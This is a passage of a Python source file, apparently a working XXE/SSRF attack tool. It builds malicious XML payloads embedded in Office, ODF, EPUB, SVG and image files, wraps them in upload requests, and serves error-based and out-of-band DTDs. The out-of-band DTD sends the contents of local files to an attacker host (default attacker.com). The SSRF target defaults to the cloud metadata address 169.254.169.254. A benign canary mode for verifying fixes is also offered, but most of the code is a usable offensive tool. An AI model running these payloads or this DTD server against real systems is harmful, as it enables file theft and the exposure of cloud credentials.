    """生成最小 EPUB。mimetype 同样要求第一个且不压缩。"""
    with zipfile.ZipFile(output_path, "w") as z:
        z.writestr(zipfile.ZipInfo("mimetype"), "application/epub+zip",
                   compress_type=zipfile.ZIP_STORED)
        z.writestr("META-INF/container.xml", '''<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>''')
        z.writestr("OEBPS/content.opf", opf_payload)
        z.writestr("OEBPS/chapter1.xhtml", '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>test</title></head>
<body><p>EPUB test chapter</p></body>
</html>''')


def create_binary_carrier(carrier: str, xmp_inner_rdf: str, output_path: str):
    """将 XMP RDF/XML 嵌入真实 JPG/PNG 文件。"""
    packet = BinaryCarrierBuilder.build_xmp_packet(xmp_inner_rdf)
    if carrier == "jpg":
        data = BinaryCarrierBuilder.make_jpeg_with_xmp(packet)
    elif carrier == "png":
        data = BinaryCarrierBuilder.make_png_with_xmp(packet)
    else:
        raise ValueError(f"Unsupported binary carrier: {carrier}")
    with open(output_path, "wb") as f:
        f.write(data)


# ============================================================================
# 第六部分：传输层封装器 (新增)
# ============================================================================

class TransportWrapper:
    """
    将生成的 Payload 封装为可直接发送的 HTTP 请求。
    用于绕过"只看 body 不看 multipart 附件"的薄弱校验层,
    或构造 SOAP with Attachments 风格的投递方式。
    """

    @staticmethod
    def multipart_upload(url_path: str, field_name: str, filename: str,
                         content: bytes, content_type: str,
                         extra_fields: Optional[Dict[str, str]] = None) -> bytes:
        """
        构造 multipart/form-data 完整请求体 (不含请求行头, 返回 body 与 boundary)。
        返回: (body_bytes, content_type_header)
        """
        boundary = "----XXETestBoundary" + uuid.uuid4().hex[:16]
        parts = []

        for k, v in (extra_fields or {}).items():
            parts.append(
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{k}"\r\n\r\n'
                f"{v}\r\n".encode("utf-8")
            )

        file_header = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n"
        ).encode("utf-8")
        parts.append(file_header)
        parts.append(content if isinstance(content, bytes) else content.encode("utf-8"))
        parts.append(f"\r\n--{boundary}--\r\n".encode("utf-8"))

        body = b"".join(parts)
        return body, f"multipart/form-data; boundary={boundary}"

    @staticmethod
    def soap_with_attachment(soap_envelope: str, attachment_cid: str,
                             attachment_content: bytes,
                             attachment_type: str = "application/octet-stream") -> bytes:
        """
        构造 MTOM/SwA 风格的 multipart/related 请求体。
        用于测试 SOAP 附件处理链上的 XML 解析器。
        """
        boundary = "----XXESwABoundary" + uuid.uuid4().hex[:16]
        body = (
            f"--{boundary}\r\n"
            f'Content-Type: text/xml; charset=utf-8\r\n'
            f'Content-Transfer-Encoding: 8bit\r\n'
            f'Content-ID: <rootpart>\r\n\r\n'
            f"{soap_envelope}\r\n"
            f"--{boundary}\r\n"
            f"Content-Type: {attachment_type}\r\n"
            f"Content-Transfer-Encoding: binary\r\n"
            f"Content-ID: <{attachment_cid}>\r\n\r\n"
        ).encode("utf-8")
        body += attachment_content
        body += f"\r\n--{boundary}--\r\n".encode("utf-8")
        return body, f'multipart/related; type="text/xml"; boundary={boundary}'

    @staticmethod
    def build_http_request(method: str, path: str, host: str,
                           content_type: str, body: bytes,
                           extra_headers: Optional[Dict[str, str]] = None) -> bytes:
        """生成可直接用 nc/socket 发送的原始 HTTP 请求文本。"""
        headers = {
            "Host": host,
            "User-Agent": "XXE-Audit-Client/2.0 (authorized test)",
            "Content-Type": content_type,
            "Content-Length": str(len(body)),
            "Connection": "close",
        }
        headers.update(extra_headers or {})
        head = f"{method} {path} HTTP/1.1\r\n"
        head += "".join(f"{k}: {v}\r\n" for k, v in headers.items())
        head += "\r\n"
        return head.encode("utf-8") + body


# ============================================================================
# 第七部分：DTD / Canary HTTP 服务
# ============================================================================

class MaliciousDTDHandler(SimpleHTTPRequestHandler):
    target_file = "/etc/hostname"
    log_file = "callbacks.jsonl"

    def do_GET(self):
        event = {
            "time": now_string(),
            "path": self.path,
            "source_ip": self.client_address[0],
            "source_port": self.client_address[1],
            "user_agent": self.headers.get("User-Agent", "N/A"),
            "host": self.headers.get("Host", "N/A"),
        }

        # 从 Host 头解析 canary 类别 (verify_fix 模式)
        host = event["host"]
        if ".fp-" in host or host.startswith("fp-"):
            for tag in ("doctype", "param", "xinc", "schema", "svg",
                        "ooxml", "odf", "xmp", "basic", "soap", "office"):
                if f"fp-{tag}-" in host or f"{tag}-" in host:
                    event["canary_category"] = tag
                    break
            print(f"\n[!] VERIFY-FIX CANARY 命中: 类别={event.get('canary_category', 'unknown')}")

        print(f"\n{'=' * 70}")
        print(f"[+] 收到请求: {event['path']}")
        print(f"    来源: {event['source_ip']}:{event['source_port']}")
        print(f"    Host: {event['host']}")
        print(f"    User-Agent: {event['user_agent']}")

        if "?data=" in self.path or "?d=" in self.path:
            key = "?data=" if "?data=" in self.path else "?d="
            data_part = self.path.split(key, 1)[-1]
            event["exfil_data"] = data_part
            print(f"    [!] 可能的外带数据: {data_part}")

        print(f"{'=' * 70}\n")
        self._append_log(event)

        if self.path.startswith("/evil.dtd"):
            self._send_text(self._get_error_based_dtd(), "application/xml-dtd")
            return
        if self.path.startswith("/oob.dtd"):
            self._send_text(self._get_oob_dtd(), "application/xml-dtd")
            return
        if self.path.startswith("/ping"):
            self._send_text("pong\n", "text/plain")
            return
        if self.path.startswith("/canary"):
            # canary 端点返回合法但无内容的 DTD, 避免目标因解析失败产生噪音
            self._send_text("<!-- canary -->\n", "application/xml-dtd")
            return

        self._send_text("OK\n", "text/plain")

    def _append_log(self, event: Dict):
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(event, ensure_ascii=False) + "\n")
        except OSError:
            pass

    def _send_text(self, content: str, content_type: str = "text/plain"):
        data = content.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _get_error_based_dtd(self) -> str:
        file_uri = normalize_file_uri(self.target_file)
        return (
            f'<!ENTITY % file SYSTEM "{file_uri}">\n'
            f'<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            f'\'file:///nonexistent_xxe_error/&#x25;file;\'>">\n'
            f'%eval;\n'
            f'%error;\n'
        )

    def _get_oob_dtd(self) -> str:
        file_uri = normalize_file_uri(self.target_file)
        server_host = self.headers.get("Host", "attacker.com")
        return (
            f'<!ENTITY % file SYSTEM "{file_uri}">\n'
            f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
            f'\'http://{server_host}/?data=&#x25;file;\'>">\n'
            f'%eval;\n'
            f'%exfil;\n'
        )

    def log_message(self, format, *args):
        pass


def start_dtd_server(port: int, target_file: str, bind: str = "0.0.0.0",
                     log_file: str = "callbacks.jsonl"):
    MaliciousDTDHandler.target_file = target_file
    MaliciousDTDHandler.log_file = log_file

    try:
        server = ThreadingHTTPServer((bind, port), MaliciousDTDHandler)
    except OSError as e:
        print(f"[!] DTD Server 启动失败: {e}")
        return

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║            XXE DTD / Canary HTTP Server 已启动              ║
╠══════════════════════════════════════════════════════════════╣
║  监听地址: {bind}:{port}
║  目标文件: {target_file}
║  日志文件: {log_file}
║
║  端点:
║    /evil.dtd   - Error-Based XXE DTD
║    /oob.dtd    - OOB 数据回传 DTD
║    /canary     - 修复验证 canary (自动识别 Host 前缀类别)
║    /ping       - 连通性测试
║
║  按 Ctrl+C 停止服务器
╚══════════════════════════════════════════════════════════════╝
""")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务器已停止")
        server.server_close()


# ============================================================================
# 第八部分：报告与保存
# ============================================================================

class ReportHelper:
    @staticmethod
    def generate_text_report(results: Dict[str, List[Dict]]) -> str:
        lines = []
        lines.append("=" * 80)
        lines.append(f"XXE/SSRF Payload 生成报告 v{VERSION}")
        lines.append("=" * 80)

        total = 0
        for category, payloads in results.items():
            if not payloads:
                continue
            lines.append("")
            lines.append("-" * 80)
            lines.append(f"[{category}] 共 {len(payloads)} 个 Payload")
            lines.append("-" * 80)

            for index, p in enumerate(payloads, 1):
                total += 1
                lines.append("")
                lines.append(f"{index}. {p.get('name', 'unnamed')}")
                lines.append(f"   技术: {p.get('technique', 'N/A')}")
                lines.append(f"   说明: {p.get('description', '')}")

                if p.get("benign"):
                    lines.append("   [BENIGN] 无害探测, 可用于修复验证")
                if p.get("injection_point"):
                    lines.append(f"   注入点: {p.get('injection_point')}")
                if p.get("target_component"):
                    lines.append(f"   投递组件: {', '.join(p['target_component'])}")
                if p.get("content_type"):
                    lines.append(f"   Content-Type: {p.get('content_type')}")
                if p.get("method"):
                    lines.append(f"   HTTP Method: {p.get('method')}")
                if p.get("expected_when_fixed"):
                    lines.append(f"   修复生效预期: {p.get('expected_when_fixed')}")
                if p.get("expected_when_vulnerable"):
                    lines.append(f"   仍有漏洞预期: {p.get('expected_when_vulnerable')}")

                interp = p.get("interpretation")
                if interp:
                    lines.append("   结果判读:")
                    for k, v in interp.items():
                        lines.append(f"     - {k}: {v}")

                reqs = p.get("requirements", [])
                if reqs:
                    lines.append("   前提条件:")
                    for r in reqs:
                        lines.append(f"     - {r}")

        lines.append("")
        lines.append("=" * 80)
        lines.append(f"总计生成 {total} 个 Payload")
        lines.append("=" * 80)
        return "\n".join(lines)


def save_payloads_to_files(results: Dict[str, List[Dict]], output_dir: str):
    ensure_dir(output_dir)

    for category, payloads in results.items():
        if not payloads:
            continue

        category_dir = os.path.join(output_dir, safe_filename(category))
        ensure_dir(category_dir)

        for index, p in enumerate(payloads, 1):
            name = safe_filename(p.get("name", f"payload_{index}"))
            payload = p.get("payload", "")
            file_ext = p.get("file_ext", ".xml")

            try:
                if p.get("ooxml_kind"):
                    file_path = os.path.join(category_dir, f"{index:02d}_{name}{file_ext}")
                    create_ooxml_package(
                        p["ooxml_kind"], payload, file_path,
                        injection=p.get("ooxml_injection", "customxml"),
                    )
                elif p.get("odf_kind"):
                    file_path = os.path.join(category_dir, f"{index:02d}_{name}{file_ext}")
                    create_odf_package(
                        p["odf_kind"], payload, file_path,
                        mimetype=p.get("odf_mimetype",
                                       "application/vnd.oasis.opendocument.text"),
                        injection=p.get("odf_injection", "content"),
                    )
                elif p.get("epub"):
                    file_path = os.path.join(category_dir, f"{index:02d}_{name}.epub")
                    create_epub_package(payload, file_path)
                elif p.get("binary_carrier"):
                    file_path = os.path.join(category_dir, f"{index:02d}_{name}{file_ext}")
                    create_binary_carrier(p["binary_carrier"], payload, file_path)
                else:
                    file_path = os.path.join(category_dir, f"{index:02d}_{name}{file_ext}")
                    with open(file_path, "w", encoding="utf-8") as f:
                        f.write(payload)
            except Exception as e:
                print(f"[!] 保存失败 {name}: {e}")
                continue

            # 附加产物
            if p.get("evil_dtd"):
                with open(os.path.join(category_dir, f"{index:02d}_{name}_evil.dtd"),
                          "w", encoding="utf-8") as f:
                    f.write(p["evil_dtd"])

            if p.get("injection_fragment"):
                with open(os.path.join(category_dir, f"{index:02d}_{name}_fragment.txt"),
                          "w", encoding="utf-8") as f:
                    f.write(p["injection_fragment"])

            # multipart 传输样例 (针对可上传类 payload)
            if p.get("binary_carrier") or p.get("ooxml_kind") or p.get("odf_kind") \
                    or file_ext in (".svg", ".jpg", ".png"):
                try:
                    with open(file_path, "rb") as f:
                        raw = f.read()
                    body, ct = TransportWrapper.multipart_upload(
                        "/upload", "file", os.path.basename(file_path),
                        raw, p.get("content_type", "application/octet-stream"),
                    )
                    req = TransportWrapper.build_http_request(
                        "POST", "/upload", "TARGET_HOST", ct, body)
                    with open(os.path.join(category_dir, f"{index:02d}_{name}_http_request.txt"),
                              "wb") as f:
                        f.write(req)
                except OSError:
                    pass

            # metadata
            meta = dict(p)
            for k in ("payload", "evil_dtd", "raw_xml", "base64_saml"):
                if k in meta:
                    meta[k] = "[saved separately]"
            try:
                with open(os.path.join(category_dir, f"{index:02d}_{name}_meta.json"),
                          "w", encoding="utf-8") as f:
                    json.dump(meta, f, ensure_ascii=False, indent=2)
            except OSError:
                pass

    report = ReportHelper.generate_text_report(results)
    report_path = os.path.join(output_dir, "report.txt")
    try:
        with open(report_path, "w", encoding="utf-8") as f:
            f.write(report)
    except OSError as e:
        print(f"[!] 保存报告失败: {e}")

    print(f"[+] Payload 已保存到: {output_dir}")
    print(f"[+] 报告已保存到: {report_path}")


# ============================================================================
# 第九部分：命令行界面
# ============================================================================

def print_banner():
    print(r"""
╔══════════════════════════════════════════════════════════════════════╗
║      XXE / SSRF Payload Generator & Fix Verifier  v2.0               ║
║                                                                      ║
║      场景: SOAP | SVG | OOXML | ODF | EPUB | XMP(JPG/PNG) | SAML     ║
║            RSS/Atom | WebDAV | Spring | XLIFF | PLIST | KML/GPX      ║
║                                                                      ║
║      防御: Fingerprint 指纹识别 | verify_fix 修复验证套件            ║
║                                                                      ║
║      仅用于授权安全测试、靶场验证、内部合规评估                      ║
╚══════════════════════════════════════════════════════════════════════╝
""")


def list_modes():
    print("""
攻击面模式 (需授权):
  basic          基础外部实体
  local_dtd      Local DTD Reuse (出网受限环境)
  error_based    Error-Based XXE
  blind_ssrf     Blind SSRF (参数实体/DOCTYPE/DNS canary)
  xinclude       XInclude 文件读取/SSRF
  schema_ssrf    Schema Location SSRF
  soap           SOAP 1.1/1.2/XInclude/Schema
  svg            SVG 上传/转换/预览
  office         OOXML docx/xlsx/pptx (customXml/document/core.xml 多注入点)
  odf            ODF odt/ods/odp (content.xml/meta.xml)
  epub           EPUB 电子书
  xmp_image      JPG/PNG XMP 元数据注入 (生成真实图片)
  misc_xml       Excel2003 XML / XLIFF / PLIST / KML / GPX / POM / XMP
  saml           SAML Response (Raw/Base64 POST/Schema)
  rss_atom       RSS / Atom Feed
  webdav         WebDAV PROPFIND / CalDAV REPORT
  spring_xml     Spring XML 配置

防御/验证模式:
  fingerprint    解析器指纹识别 (天然无害, 7 个探针)
  verify_fix     修复验证套件 (全 canary, 零回连即修复生效)
  --probe        全局无害开关: 所有模式的 file/ssrf 替换为 canary

综合模式:
  scenario_auto  全部业务场景
  auto           全部 (攻击面 + 指纹)

服务:
  --serve        启动 DTD/Canary HTTP Server

关键参数:
  --target-file  目标文件 (默认 /etc/hostname)
  --attacker-url DTD/Canary 服务器地址
  --ssrf-url     SSRF 目标 (默认云元数据)
  --probe        无害模式
  -o             输出目录
  --json         JSON 输出
""")


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="XXE/SSRF Payload 生成与防御验证工具 v2.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
示例:
  # 攻击面测试 (授权环境)
  python %(prog)s --mode office -f /etc/hostname -o ./office_out
  python %(prog)s --mode xmp_image -a http://your-server:8080 -o ./xmp_out
  python %(prog)s --mode odf -o ./odf_out

  # 防御验证工作流
  python %(prog)s --serve --port 8080                        # 终端1: 起 canary 服务
  python %(prog)s --mode verify_fix -a http://YOUR_IP:8080 -o ./verify
  # 上传 ./verify 下全部文件, 检查 callbacks.jsonl 零回连即修复有效

  # 指纹识别 (先摸清解析器配置再选 Payload)
  python %(prog)s --mode fingerprint -o ./fp

  # 全量无害探测
  python %(prog)s --mode auto --probe -a http://YOUR_IP:8080 -o ./probe_out
        """)
    )

    parser.add_argument("--mode", "-m", choices=[
        "basic", "local_dtd", "error_based", "blind_ssrf", "xinclude", "schema_ssrf",
        "soap", "svg", "office", "odf", "epub", "xmp_image", "misc_xml",
        "saml", "rss_atom", "webdav", "spring_xml",
        "fingerprint", "verify_fix",
        "scenario_auto", "auto",
    ], help="Payload 生成模式")

    parser.add_argument("--list", "-l", action="store_true", help="列出可用模式")
    parser.add_argument("--platform", "-p", default="java",
                        choices=["java", "dotnet", "php"], help="目标平台")
    parser.add_argument("--os", default="linux",
                        choices=["linux", "windows"], help="目标操作系统")
    parser.add_argument("--target-file", "-f", default="/etc/hostname",
                        help="要测试读取的目标文件")
    parser.add_argument("--attacker-url", "-a", default="http://attacker.com",
                        help="DTD/Canary 服务器地址")
    parser.add_argument("--ssrf-url", "-s",
                        default="http://169.254.169.254/latest/meta-data/",
                        help="SSRF 目标 URL")
    parser.add_argument("--probe", action="store_true",
                        help="无害模式: 全部 file/ssrf 目标替换为 canary, 用于防御验证")
    parser.add_argument("--output", "-o", default="./xxe_payloads_v2", help="输出目录")
    parser.add_argument("--json", action="store_true", help="JSON 输出")
    parser.add_argument("--no-save", action="store_true", help="不自动保存到文件")

    parser.add_argument("--serve", action="store_true", help="启动 DTD/Canary Server")
    parser.add_argument("--bind", default="0.0.0.0", help="绑定地址")
    parser.add_argument("--port", type=int, default=8080, help="端口")
    parser.add_argument("--log-file", default="callbacks.jsonl", help="回连日志文件")

    return parser


def payloads_to_jsonable(payloads: List[Dict]) -> List[Dict]:
    keys = ("name", "technique", "description", "payload", "evil_dtd",
            "injection_fragment", "injection_point", "content_type", "method",
            "headers", "file_ext", "ooxml_kind", "odf_kind", "binary_carrier",
            "target_component", "benign", "interpretation",
            "expected_when_fixed", "expected_when_vulnerable", "requirements")
    return [{k: p.get(k) for k in keys if p.get(k) is not None} for p in payloads]


def generate_by_mode(g: XXEPayloadGenerator, mode: str) -> Dict[str, List[Dict]]:
    mapping = {
        "basic": lambda: {"basic": [g.generate_basic_file_entity_payload()]},
        "local_dtd": lambda: {"local_dtd": g.generate_local_dtd_payload()},
        "error_based": lambda: {"error_based": [g.generate_error_based_payload()]},
        "blind_ssrf": lambda: {"blind_ssrf": g.generate_blind_ssrf_payload()},
        "xinclude": lambda: {"xinclude": g.generate_xinclude_payload()},
        "schema_ssrf": lambda: {"schema_ssrf": g.generate_schema_ssrf_payload()},
        "soap": lambda: {"soap": g.generate_soap_payloads()},
        "svg": lambda: {"svg": g.generate_svg_payloads()},
        "office": lambda: {"office_ooxml": g.generate_office_payloads()},
        "odf": lambda: {"office_odf": g.generate_odf_payloads()},
        "epub": lambda: {"epub": g.generate_epub_payloads()},
        "xmp_image": lambda: {"xmp_image": g.generate_xmp_image_payloads()},
        "misc_xml": lambda: {"misc_xml": g.generate_misc_xml_payloads()},
        "saml": lambda: {"saml": g.generate_saml_payloads()},
        "rss_atom": lambda: {"rss_atom": g.generate_rss_atom_payloads()},
        "webdav": lambda: {"webdav": g.generate_webdav_payloads()},
        "spring_xml": lambda: {"spring_xml": g.generate_spring_xml_payloads()},
        "fingerprint": lambda: {"fingerprint": g.generate_fingerprint_payloads()},
        "verify_fix": lambda: g.generate_verify_fix_suite(),
        "scenario_auto": g.generate_scenario_payloads,
        "auto": g.generate_all_payloads,
    }
    if mode not in mapping:
        raise ValueError(f"Unsupported mode: {mode}")
    return mapping[mode]()


def print_payloads(results: Dict[str, List[Dict]]):
    print(ReportHelper.generate_text_report(results))

    for category, payloads in results.items():
        if not payloads:
            continue
        print(f"\n{'#' * 80}\n# CATEGORY: {category}\n{'#' * 80}")

        for i, p in enumerate(payloads, 1):
            print(f"\n{'=' * 80}")
            print(f"[{i}] {p.get('name', 'unnamed')}")
            print(f"技术: {p.get('technique', 'N/A')}")
            print(f"说明: {p.get('description', '')}")

            for label, key in (("注入点", "injection_point"),
                               ("HTTP Method", "method"),
                               ("Content-Type", "content_type")):
                if p.get(key):
                    print(f"{label}: {p[key]}")

            if p.get("target_component"):
                print(f"投递组件: {', '.join(p['target_component'])}")
            if p.get("headers"):
                print("建议 Headers:")
                print(json.dumps(p["headers"], ensure_ascii=False, indent=2))
            if p.get("interpretation"):
                print("结果判读:")
                for k, v in p["interpretation"].items():
                    print(f"  - {k}: {v}")

            if p.get("ooxml_kind") or p.get("odf_kind") or p.get("epub") \
                    or p.get("binary_carrier"):
                print("[说明] 控制台展示的是内部 XML; 保存时会生成真实的容器/图片文件。")

            print("\n--- Payload (内部 XML) ---")
            print(textwrap.indent(p.get("payload", ""), "  "))

            if p.get("evil_dtd"):
                print("\n--- evil.dtd ---")
                print(textwrap.indent(p["evil_dtd"], "  "))
            if p.get("base64_saml"):
                print("\n--- Base64 SAMLResponse ---")
                print(textwrap.indent(p["base64_saml"], "  "))

            if p.get("requirements"):
                print("\n前提条件:")
                for r in p["requirements"]:
                    print(f"  - {r}")


def main():
    print_banner()
    parser = build_arg_parser()
    args = parser.parse_args()

    if args.list:
        list_modes()
        return

    if args.serve:
        start_dtd_server(port=args.port, target_file=args.target_file,
                         bind=args.bind, log_file=args.log_file)
        return

    if not args.mode:
        parser.print_help()
        print("\n[!] 请指定 --mode，或使用 --list 查看可用模式。")
        return

    generator = XXEPayloadGenerator(
        target_file=args.target_file,
        attacker_url=args.attacker_url,
        ssrf_url=args.ssrf_url,
        target_os=args.os,
        platform=args.platform,
        benign=args.probe,
    )

    try:
        results = generate_by_mode(generator, args.mode)
    except ValueError as e:
        print(f"[!] {e}")
        return

    if not any(results.values()):
        print(f"[!] 没有生成任何 Payload。mode={args.mode}, "
              f"platform={args.platform}, os={args.os}, probe={args.probe}")
        return

    if args.json:
        print(json.dumps(
            {c: payloads_to_jsonable(ps) for c, ps in results.items()},
            ensure_ascii=False, indent=2))
        return

    print_payloads(results)

    save_modes = {
        "office", "odf", "epub", "xmp_image", "svg", "saml", "soap",
        "rss_atom", "webdav", "spring_xml", "misc_xml",
        "fingerprint", "verify_fix", "scenario_auto", "auto",
    }
    if args.mode in save_modes and not args.no_save:
        save_payloads_to_files(results, args.output)
    else:
        print(f"\n[*] 如需保存到文件，可使用 -o {args.output} 或场景/综合模式。")


if __name__ == "__main__":
    main()
